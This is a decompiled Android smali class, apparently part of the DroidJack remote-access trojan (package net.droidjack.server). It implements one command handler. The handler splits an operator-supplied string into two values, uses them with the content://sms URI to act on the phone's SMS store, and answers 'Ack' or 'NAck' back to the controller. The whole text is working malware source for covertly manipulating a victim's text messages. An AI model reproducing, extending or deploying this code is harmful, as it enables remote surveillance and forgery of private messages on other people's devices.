.class Lnet/droidjack/server/bv;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/util/concurrent/Callable;


# instance fields
.field final synthetic a:Lnet/droidjack/server/bt;

.field private final synthetic b:Ljava/lang/String;


# direct methods
.method constructor <init>(Lnet/droidjack/server/bt;Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/bv;->a:Lnet/droidjack/server/bt;

    iput-object p2, p0, Lnet/droidjack/server/bv;->b:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public a()[B
    .locals 4

    :try_start_0
    const-string v0, "content://sms"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    iget-object v1, p0, Lnet/droidjack/server/bv;->b:Ljava/lang/String;

    const-string v2, ",."

    invoke-virtual {v1, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    sget-object v3, Ljava/lang/System;->out:Ljava/io/PrintStream;

    invoke-virtual {v3, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    const/4 v1, 0x0

    aget-object v1, v2, v1

    const/4 v3, 0x1

    aget-object v2, v2, v3

    iget-object v3, p0, Lnet/droidjack/server/bv;->a:Lnet/droidjack/server/bt;

    invoke-static {v3, v0, v1, v2}, Lnet/droidjack/server/bt;->a(Lnet/droidjack/server/bt;Landroid/net/Uri;Ljava/lang/String;Ljava/lang/String;)I

    const-string v0, "Ack"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    move-object v1, v0

    invoke-static {v1}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    const-string v0, "NAck"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method public synthetic call()Ljava/lang/Object;
    .locals 1

    invoke-virtual {p0}, Lnet/droidjack/server/bv;->a()[B

    move-result-object v0

    return-object v0
.end method
